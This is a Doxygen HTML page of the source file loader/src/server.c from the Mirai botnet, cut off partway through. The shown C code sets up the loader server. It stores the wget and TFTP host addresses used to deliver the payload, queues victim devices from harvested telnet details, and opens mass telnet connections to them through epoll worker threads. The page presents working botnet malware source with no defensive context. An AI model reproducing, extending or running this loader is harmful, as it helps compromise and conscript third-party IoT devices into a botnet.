<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=9"/>
<meta name="generator" content="Doxygen 1.8.11"/>
<title>Mirai: loader/src/server.c Source File</title>
<link href="tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="dynsections.js"></script>
<link href="navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="resize.js"></script>
<script type="text/javascript" src="navtreedata.js"></script>
<script type="text/javascript" src="navtree.js"></script>
<script type="text/javascript">
  $(document).ready(initResizable);
  $(window).load(resizeHeight);
</script>
<link href="search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="search/searchdata.js"></script>
<script type="text/javascript" src="search/search.js"></script>
<script type="text/javascript">
  $(document).ready(function() { init_search(); });
</script>
<link href="doxygen.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr style="height: 56px;">
  <td id="projectalign" style="padding-left: 0.5em;">
   <div id="projectname">Mirai
   </div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.8.11 -->
<script type="text/javascript">
var searchBox = new SearchBox("searchBox", "search",false,'Search');
</script>
  <div id="navrow1" class="tabs">
    <ul class="tablist">
      <li><a href="index.html"><span>Main&#160;Page</span></a></li>
      <li><a href="pages.html"><span>Related&#160;Pages</span></a></li>
      <li><a href="annotated.html"><span>Data&#160;Structures</span></a></li>
      <li class="current"><a href="files.html"><span>Files</span></a></li>
      <li>
        <div id="MSearchBox" class="MSearchBoxInactive">
        <span class="left">
          <img id="MSearchSelect" src="search/mag_sel.png"
               onmouseover="return searchBox.OnSearchSelectShow()"
               onmouseout="return searchBox.OnSearchSelectHide()"
               alt=""/>
          <input type="text" id="MSearchField" value="Search" accesskey="S"
               onfocus="searchBox.OnSearchFieldFocus(true)" 
               onblur="searchBox.OnSearchFieldFocus(false)" 
               onkeyup="searchBox.OnSearchFieldChange(event)"/>
          </span><span class="right">
            <a id="MSearchClose" href="javascript:searchBox.CloseResultsWindow()"><img id="MSearchCloseImg" border="0" src="search/close.png" alt=""/></a>
          </span>
        </div>
      </li>
    </ul>
  </div>
  <div id="navrow2" class="tabs2">
    <ul class="tablist">
      <li><a href="files.html"><span>File&#160;List</span></a></li>
      <li><a href="globals.html"><span>Globals</span></a></li>
    </ul>
  </div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
$(document).ready(function(){initNavTree('server_8c_source.html','');});
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<iframe src="javascript:void(0)" frameborder="0" 
        name="MSearchResults" id="MSearchResults">
</iframe>
</div>

<div class="header">
  <div class="headertitle">
<div class="title">server.c</div>  </div>
</div><!--header-->
<div class="contents">
<a href="server_8c.html">Go to the documentation of this file.</a><div class="fragment"><div class="line"><a name="l00001"></a><span class="lineno"><a class="line" href="server_8c.html#a369266c24eacffb87046522897a570d5">    1</a></span>&#160;<span class="preprocessor">#define _GNU_SOURCE</span></div><div class="line"><a name="l00002"></a><span class="lineno">    2</span>&#160;</div><div class="line"><a name="l00003"></a><span class="lineno">    3</span>&#160;<span class="preprocessor">#include &lt;stdio.h&gt;</span></div><div class="line"><a name="l00004"></a><span class="lineno">    4</span>&#160;<span class="preprocessor">#include &lt;stdlib.h&gt;</span></div><div class="line"><a name="l00005"></a><span class="lineno">    5</span>&#160;<span class="preprocessor">#include &lt;pthread.h&gt;</span></div><div class="line"><a name="l00006"></a><span class="lineno">    6</span>&#160;<span class="preprocessor">#include &lt;sys/epoll.h&gt;</span></div><div class="line"><a name="l00007"></a><span class="lineno">    7</span>&#160;<span class="preprocessor">#include &lt;sys/socket.h&gt;</span></div><div class="line"><a name="l00008"></a><span class="lineno">    8</span>&#160;<span class="preprocessor">#include &lt;arpa/inet.h&gt;</span></div><div class="line"><a name="l00009"></a><span class="lineno">    9</span>&#160;<span class="preprocessor">#include &lt;string.h&gt;</span></div><div class="line"><a name="l00010"></a><span class="lineno">   10</span>&#160;<span class="preprocessor">#include &lt;sched.h&gt;</span></div><div class="line"><a name="l00011"></a><span class="lineno">   11</span>&#160;<span class="preprocessor">#include &lt;errno.h&gt;</span></div><div class="line"><a name="l00012"></a><span class="lineno">   12</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="loader_2src_2headers_2includes_8h.html">headers/includes.h</a>&quot;</span></div><div class="line"><a name="l00013"></a><span class="lineno">   13</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="server_8h.html">headers/server.h</a>&quot;</span></div><div class="line"><a name="l00014"></a><span class="lineno">   14</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="telnet__info_8h.html">headers/telnet_info.h</a>&quot;</span></div><div class="line"><a name="l00015"></a><span class="lineno">   15</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="connection_8h.html">headers/connection.h</a>&quot;</span></div><div class="line"><a name="l00016"></a><span class="lineno">   16</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="binary_8h.html">headers/binary.h</a>&quot;</span></div><div class="line"><a name="l00017"></a><span class="lineno">   17</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="loader_2src_2headers_2util_8h.html">headers/util.h</a>&quot;</span></div><div class="line"><a name="l00018"></a><span class="lineno">   18</span>&#160;</div><div class="line"><a name="l00019"></a><span class="lineno"><a class="line" href="server_8c.html#a2cf30fe0bab904fee00364d90af96a01">   19</a></span>&#160;<span class="keyword">struct </span><a class="code" href="structserver.html">server</a> *<a class="code" href="server_8c.html#a2cf30fe0bab904fee00364d90af96a01">server_create</a>(uint8_t threads, uint8_t addr_len, <a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a> *addrs, uint32_t <a class="code" href="structserver.html#a3dc885b39e0b71d53698b376f161d9df">max_open</a>, <span class="keywordtype">char</span> *wghip, <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> wghp, <span class="keywordtype">char</span> *thip)</div><div class="line"><a name="l00020"></a><span class="lineno">   20</span>&#160;{</div><div class="line"><a name="l00021"></a><span class="lineno">   21</span>&#160;    <span class="keyword">struct </span><a class="code" href="structserver.html">server</a> *<a class="code" href="loader_2src_2main_8c.html#a1b6916fd6bd625513f86cc35333623c9">srv</a> = calloc(1, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structserver.html">server</a>));</div><div class="line"><a name="l00022"></a><span class="lineno">   22</span>&#160;    <span class="keyword">struct </span><a class="code" href="structserver__worker.html">server_worker</a> *workers = calloc(threads, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structserver__worker.html">server_worker</a>));</div><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00024"></a><span class="lineno">   24</span>&#160;</div><div class="line"><a name="l00025"></a><span class="lineno">   25</span>&#160;    <span class="comment">// Fill out the structure</span></div><div class="line"><a name="l00026"></a><span class="lineno">   26</span>&#160;    srv-&gt;<a class="code" href="structserver.html#ab16b9ed36cc105da325d0bbbb533635e">bind_addrs_len</a> = addr_len;</div><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;    srv-&gt;<a class="code" href="structserver.html#ab1a292223f727e8dc33b7b32971d0ac1">bind_addrs</a> = addrs;</div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;    srv-&gt;<a class="code" href="structserver.html#a3dc885b39e0b71d53698b376f161d9df">max_open</a> = max_open;</div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;    srv-&gt;<a class="code" href="structserver.html#a3429acc7dc3373cd09b6b10348ae41e6">wget_host_ip</a> = wghip;</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;    srv-&gt;<a class="code" href="structserver.html#a1e2b34c57e3b5606aa8446e64823d725">wget_host_port</a> = wghp;</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;    srv-&gt;<a class="code" href="structserver.html#a04a30da3dd86aa73499c6d5e2e48311c">tftp_host_ip</a> = thip;</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;    srv-&gt;<a class="code" href="structserver.html#a712c73b78adff8b0f9d0c824d87eb2c1">estab_conns</a> = calloc(max_open * 2, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structconnection.html">connection</a> *));</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;    srv-&gt;<a class="code" href="structserver.html#a33515ab0c529621ecc5d317770637cb2">workers</a> = calloc(threads, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structserver__worker.html">server_worker</a>));</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;    srv-&gt;<a class="code" href="structserver.html#ab158131791f1fea8a823fc2388d9ab82">workers_len</a> = threads;</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;    <span class="keywordflow">if</span> (srv-&gt;<a class="code" href="structserver.html#a712c73b78adff8b0f9d0c824d87eb2c1">estab_conns</a> == NULL)</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;    {</div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;        printf(<span class="stringliteral">&quot;Failed to allocate establisted_connections array\n&quot;</span>);</div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;        exit(0);</div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;    }</div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;    <span class="comment">// Allocate locks internally</span></div><div class="line"><a name="l00043"></a><span class="lineno">   43</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; max_open * 2; i++)</div><div class="line"><a name="l00044"></a><span class="lineno">   44</span>&#160;    {</div><div class="line"><a name="l00045"></a><span class="lineno">   45</span>&#160;        srv-&gt;<a class="code" href="structserver.html#a712c73b78adff8b0f9d0c824d87eb2c1">estab_conns</a>[i] = calloc(1, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structconnection.html">connection</a>));</div><div class="line"><a name="l00046"></a><span class="lineno">   46</span>&#160;        <span class="keywordflow">if</span> (srv-&gt;<a class="code" href="structserver.html#a712c73b78adff8b0f9d0c824d87eb2c1">estab_conns</a>[i] == NULL)</div><div class="line"><a name="l00047"></a><span class="lineno">   47</span>&#160;        {</div><div class="line"><a name="l00048"></a><span class="lineno">   48</span>&#160;            printf(<span class="stringliteral">&quot;Failed to allocate connection %d\n&quot;</span>, i);</div><div class="line"><a name="l00049"></a><span class="lineno">   49</span>&#160;            exit(-1);</div><div class="line"><a name="l00050"></a><span class="lineno">   50</span>&#160;        }</div><div class="line"><a name="l00051"></a><span class="lineno">   51</span>&#160;        pthread_mutex_init(&amp;(srv-&gt;<a class="code" href="structserver.html#a712c73b78adff8b0f9d0c824d87eb2c1">estab_conns</a>[i]-&gt;<a class="code" href="structconnection.html#aaecdd2ee669a3728ae131c4d09fb3a33">lock</a>), NULL);</div><div class="line"><a name="l00052"></a><span class="lineno">   52</span>&#160;    }</div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;</div><div class="line"><a name="l00054"></a><span class="lineno">   54</span>&#160;    <span class="comment">// Create worker threads</span></div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; threads; i++)</div><div class="line"><a name="l00056"></a><span class="lineno">   56</span>&#160;    {</div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;        <span class="keyword">struct </span><a class="code" href="structserver__worker.html">server_worker</a> *wrker = &amp;srv-&gt;<a class="code" href="structserver.html#a33515ab0c529621ecc5d317770637cb2">workers</a>[i];</div><div class="line"><a name="l00058"></a><span class="lineno">   58</span>&#160;</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;        wrker-&gt;<a class="code" href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">srv</a> = <a class="code" href="loader_2src_2main_8c.html#a1b6916fd6bd625513f86cc35333623c9">srv</a>;</div><div class="line"><a name="l00060"></a><span class="lineno">   60</span>&#160;        wrker-&gt;<a class="code" href="structserver__worker.html#a291525712de364e6d7aabbbd69f593be">thread_id</a> = i;</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;</div><div class="line"><a name="l00062"></a><span class="lineno">   62</span>&#160;        <span class="keywordflow">if</span> ((wrker-&gt;<a class="code" href="structserver__worker.html#a34827de4a680ff23c1c2bd27e446edf2">efd</a> = epoll_create1(0)) == -1)</div><div class="line"><a name="l00063"></a><span class="lineno">   63</span>&#160;        {</div><div class="line"><a name="l00064"></a><span class="lineno">   64</span>&#160;            printf(<span class="stringliteral">&quot;Failed to initialize epoll context. Error code %d\n&quot;</span>, errno);</div><div class="line"><a name="l00065"></a><span class="lineno">   65</span>&#160;            <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(srv-&gt;<a class="code" href="structserver.html#a33515ab0c529621ecc5d317770637cb2">workers</a>);</div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;            <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(srv);</div><div class="line"><a name="l00067"></a><span class="lineno">   67</span>&#160;            <span class="keywordflow">return</span> NULL;</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;        }</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;        pthread_create(&amp;wrker-&gt;<a class="code" href="structserver__worker.html#aef6ffc9c0b7ab0c33e0ef9e450a38c36">thread</a>, NULL, <a class="code" href="server_8c.html#af3aa5bbc2215e215af2afeb31b29bfca">worker</a>, wrker);</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;    }</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;    pthread_create(&amp;srv-&gt;<a class="code" href="structserver.html#ad8123701a3acf99403ac059a5f541cbd">to_thrd</a>, NULL, <a class="code" href="server_8c.html#ad0ffd480caf2f4573b8ededde26577e2">timeout_thread</a>, srv);</div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;    <span class="keywordflow">return</span> <a class="code" href="loader_2src_2main_8c.html#a1b6916fd6bd625513f86cc35333623c9">srv</a>;</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;}</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;</div><div class="line"><a name="l00078"></a><span class="lineno"><a class="line" href="server_8c.html#a15c57c2a3267d6e72f11825bf46ab806">   78</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="server_8c.html#a15c57c2a3267d6e72f11825bf46ab806">server_destroy</a>(<span class="keyword">struct</span> <a class="code" href="structserver.html">server</a> *<a class="code" href="loader_2src_2main_8c.html#a1b6916fd6bd625513f86cc35333623c9">srv</a>)</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;{</div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;    <span class="keywordflow">if</span> (srv == NULL)</div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;    <span class="keywordflow">if</span> (srv-&gt;<a class="code" href="structserver.html#ab1a292223f727e8dc33b7b32971d0ac1">bind_addrs</a> != NULL)</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;        <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(srv-&gt;<a class="code" href="structserver.html#ab1a292223f727e8dc33b7b32971d0ac1">bind_addrs</a>);</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;    <span class="keywordflow">if</span> (srv-&gt;<a class="code" href="structserver.html#a33515ab0c529621ecc5d317770637cb2">workers</a> != NULL)</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;        <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(srv-&gt;<a class="code" href="structserver.html#a33515ab0c529621ecc5d317770637cb2">workers</a>);</div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;    <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(srv);</div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;}</div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;</div><div class="line"><a name="l00089"></a><span class="lineno"><a class="line" href="server_8c.html#a619e9617d6a9c0458a29c25761a31fd1">   89</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="server_8c.html#a619e9617d6a9c0458a29c25761a31fd1">server_queue_telnet</a>(<span class="keyword">struct</span> <a class="code" href="structserver.html">server</a> *<a class="code" href="loader_2src_2main_8c.html#a1b6916fd6bd625513f86cc35333623c9">srv</a>, <span class="keyword">struct</span> <a class="code" href="structtelnet__info.html">telnet_info</a> *info)</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;{</div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#a97726887df4104b2cef8b87f76005317">ATOMIC_GET</a>(&amp;srv-&gt;<a class="code" href="structserver.html#a8f7152bb17f4276b2d863369d3a3468c">curr_open</a>) &gt;= srv-&gt;<a class="code" href="structserver.html#a3dc885b39e0b71d53698b376f161d9df">max_open</a>)</div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;    {</div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;        sleep(1);</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;    }</div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#a66c32fe2ced559e246bb8a27ac57cd0e">ATOMIC_INC</a>(&amp;srv-&gt;<a class="code" href="structserver.html#a8f7152bb17f4276b2d863369d3a3468c">curr_open</a>);</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;</div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;    <span class="keywordflow">if</span> (srv == NULL)</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;        printf(<span class="stringliteral">&quot;srv == NULL 3\n&quot;</span>);</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;</div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;    <a class="code" href="server_8c.html#a87188a72b71cc1291721d426413f1290">server_telnet_probe</a>(srv, info);</div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;}</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;</div><div class="line"><a name="l00103"></a><span class="lineno"><a class="line" href="server_8c.html#a87188a72b71cc1291721d426413f1290">  103</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="server_8c.html#a87188a72b71cc1291721d426413f1290">server_telnet_probe</a>(<span class="keyword">struct</span> <a class="code" href="structserver.html">server</a> *<a class="code" href="loader_2src_2main_8c.html#a1b6916fd6bd625513f86cc35333623c9">srv</a>, <span class="keyword">struct</span> <a class="code" href="structtelnet__info.html">telnet_info</a> *info)</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;{</div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;    <span class="keywordtype">int</span> fd = <a class="code" href="loader_2src_2headers_2util_8h.html#ab0861eca69488783c03d10dd318bb02d">util_socket_and_bind</a>(srv);</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;    <span class="keyword">struct </span>sockaddr_in addr;</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;    <span class="keyword">struct </span><a class="code" href="structconnection.html">connection</a> *conn;</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;    <span class="keyword">struct </span>epoll_event event;</div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;    <span class="keywordtype">int</span> ret;</div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;    <span class="keyword">struct </span><a class="code" href="structserver__worker.html">server_worker</a> *wrker = &amp;srv-&gt;<a class="code" href="structserver.html#a33515ab0c529621ecc5d317770637cb2">workers</a>[<a class="code" href="loader_2src_2headers_2includes_8h.html#a66c32fe2ced559e246bb8a27ac57cd0e">ATOMIC_INC</a>(&amp;srv-&gt;<a class="code" href="structserver.html#a0123bc1e1ea7a40a3421b475e70702a9">curr_worker_child</a>) % srv-&gt;<a class="code" href="structserver.html#ab158131791f1fea8a823fc2388d9ab82">workers_len</a>];</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;</div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;    <span class="keywordflow">if</span> (fd == -1)</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;    {</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;        <span class="keywordflow">if</span> (time(NULL) % 10 == 0)</div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;        {</div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;            printf(<span class="stringliteral">&quot;Failed to open and bind socket\n&quot;</span>);</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;        }</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;        <a class="code" href="loader_2src_2headers_2includes_8h.html#a993f1d32fc9cf3ab12b313462da9dd57">ATOMIC_DEC</a>(&amp;srv-&gt;<a class="code" href="structserver.html#a8f7152bb17f4276b2d863369d3a3468c">curr_open</a>);</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;    }</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;    <span class="keywordflow">while</span> (fd &gt;= (srv-&gt;<a class="code" href="structserver.html#a3dc885b39e0b71d53698b376f161d9df">max_open</a> * 2))</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;    {</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;        printf(<span class="stringliteral">&quot;fd too big\n&quot;</span>);</div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;        conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a> = fd;</div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;        printf(<span class="stringliteral">&quot;Can&#39;t utilize socket because client buf is not large enough\n&quot;</span>);</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;        <a class="code" href="connection_8c.html#abfa9e4a1232d41a78e5de0a510ed5752">connection_close</a>(conn);</div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;    }</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;    <span class="keywordflow">if</span> (srv == NULL)</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;        printf(<span class="stringliteral">&quot;srv == NULL 4\n&quot;</span>);</div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;</div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;    conn = srv-&gt;<a class="code" href="structserver.html#a712c73b78adff8b0f9d0c824d87eb2c1">estab_conns</a>[fd];</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;    memcpy(&amp;conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>, info, sizeof (<span class="keyword">struct</span> <a class="code" href="structtelnet__info.html">telnet_info</a>));</div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;    conn-&gt;<a class="code" href="structconnection.html#a85d448ea156e4e2129e1e7b0b3effcad">srv</a> = <a class="code" href="loader_2src_2main_8c.html#a1b6916fd6bd625513f86cc35333623c9">srv</a>;</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;    conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a> = fd;</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;    <a class="code" href="connection_8c.html#a162617f2f61ea5b24a221a6cc34d30e1">connection_open</a>(conn);</div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;</div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;    addr.sin_family = AF_INET;</div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;    addr.sin_addr.s_addr = info-&gt;<a class="code" href="structtelnet__info.html#aad0667b76ed78d53e874aeacdee342a9">addr</a>;</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;    addr.sin_port = info-&gt;<a class="code" href="structtelnet__info.html#aa5ee1ca4f4da0455d35a2407dfc7e2a0">port</a>;</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;    ret = <a class="code" href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;    <span class="keywordflow">if</span> (ret == -1 &amp;&amp; errno != EINPROGRESS)</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;    {</div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;        printf(<span class="stringliteral">&quot;got connect error\n&quot;</span>);</div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;    }</div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;</div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;    <span class="keyword">event</span>.data.fd = fd;</div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;    <span class="keyword">event</span>.events = EPOLLOUT;</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;    epoll_ctl(wrker-&gt;<a class="code" href="structserver__worker.html#a34827de4a680ff23c1c2bd27e446edf2">efd</a>, EPOLL_CTL_ADD, fd, &amp;event);</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;}</div><div class="line"><a name="l00154"></a><span class="lineno">  154</span>&#160;</div><div class="line"><a name="l00155"></a><span class="lineno"><a class="line" href="server_8c.html#a9085c60470ef6f94cdff3dcb4bf03f48">  155</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">void</span> <a class="code" href="server_8c.html#a9085c60470ef6f94cdff3dcb4bf03f48">bind_core</a>(<span class="keywordtype">int</span> core)</div><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;{</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;    pthread_t tid = pthread_self();</div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;    cpu_set_t cpuset;</div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;    CPU_ZERO(&amp;cpuset);</div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;    CPU_SET(core, &amp;cpuset);</div><div class="line"><a name="l00161"></a><span class="lineno">  161</span>&#160;    <span class="keywordflow">if</span> (pthread_setaffinity_np(tid, <span class="keyword">sizeof</span> (cpu_set_t), &amp;cpuset) != 0)</div><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;        printf(<span class="stringliteral">&quot;Failed to bind to core %d\n&quot;</span>, core);</div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;}</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;</div><div class="line"><a name="l00165"></a><span class="lineno"><a class="line" href="server_8c.html#af3aa5bbc2215e215af2afeb31b29bfca">  165</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">void</span> *<a class="code" href="server_8c.html#af3aa5bbc2215e215af2afeb31b29bfca">worker</a>(<span class="keywordtype">void</span> *arg)</div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;{</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;    <span class="keyword">struct </span><a class="code" href="structserver__worker.html">server_worker</a> *wrker = (<span class="keyword">struct </span><a 